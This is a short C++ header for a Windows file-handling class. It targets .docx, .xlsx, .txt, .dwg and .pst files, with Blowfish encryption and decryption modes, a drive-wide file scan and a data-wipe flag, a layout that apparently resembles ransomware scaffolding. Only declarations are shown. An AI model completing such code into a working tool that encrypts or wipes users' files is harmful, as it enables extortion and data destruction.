#pragma once
#include <string>
#include "blowfish.h"
#include <vector>
#include <iostream>
#include <Windows.h>
#include <thread>

#define SET_FILE_MAX_SIZE		0
#define SET_FILE_10_BYTES		1024
#define SET_FILE_10_KBYTES		1048576
class FileHandler
{
	bool _b_docx_selected = false;
	bool _b_xlsx_selected = false;
	bool _b_txt_selected = false;
	bool _b_dwg_selected = false;
	bool _b_pst_selected = false;
	bool _b_wipe_data = false;

	volatile bool isReading = false;
	volatile bool isThreading = true;
	
	std::vector <std::string> fileList;
	std::string fileName;

	

	HANDLE HFileSearchHandle;
	WIN32_FIND_DATA FileFindData;
	HANDLE ReadThread;

	uint32_t _u_max_file_size = 0;
	uint32_t _u_compress_size = 0;

	void SearchEngine(LPCWSTR Filter, LPCWSTR DriveLetter);

	std::string _s_file_name;
	enum Type {
		EncrypionType = 0,
		DecryptionType
	};
	enum FileType {
		DocX = 1,
		Xlsx,
		Txt,
		Pst,
		Dwg
	};
public:
	void setFileType(bool value, int type);

	bool MakeSingleFileProcess(int type);

	bool SetFileCompressSize(uint32_t value);

	void scanForFiles(LPCWSTR driveLetter);


};

